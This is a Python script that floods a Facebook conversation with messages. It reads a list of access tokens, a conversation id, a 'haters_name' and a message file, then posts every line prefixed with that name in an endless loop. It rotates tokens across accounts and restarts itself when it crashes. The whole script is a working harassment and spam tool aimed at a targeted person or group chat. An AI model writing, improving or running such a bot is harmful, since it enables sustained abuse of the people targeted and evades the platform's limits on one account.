import sys, json, time, requests, os, datetime, subprocess

task_id = sys.argv[1]

def log(msg):
    with open(f"worker_{task_id}.log", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.datetime.now()}] {msg}\n")
    print(msg)

def run_worker():
    try:
        with open(f"task_{task_id}.json", "r") as f:
            config = json.load(f)
        tokens = config["tokens"]
        convo_id = config["convo_id"]
        haters_name = config["haters_name"]
        delay = int(config["delay"])
        np_file = config["np_file"]

        if not os.path.exists(np_file):
            log(f"[x] NP file not found: {np_file}")
            return

        with open(np_file, "r", encoding="utf-8") as f:
            messages = [m.strip() for m in f.readlines() if m.strip()]

        count = 0
        while True:
            for i, msg in enumerate(messages):
                token = tokens[i % len(tokens)]
                url = f"https://graph.facebook.com/v15.0/t_{convo_id}"
                payload = {"access_token": token, "message": f"{haters_name} {msg}"}
                try:
                    r = requests.post(url, data=payload)
                    count += 1
                    log(f"Sent {count}: {haters_name} {msg} | Status: {r.status_code}")
                except Exception as e:
                    log(f"Error sending message: {e}")
                time.sleep(delay)
    except Exception as e:
        log(f"Worker crashed: {e}")
        time.sleep(3)
        restart_worker()

def restart_worker():
    log("♻️ Restarting worker...")
    subprocess.Popen([sys.executable, "worker.py", task_id])
    log("♻️ Worker restarted successfully")

run_worker()
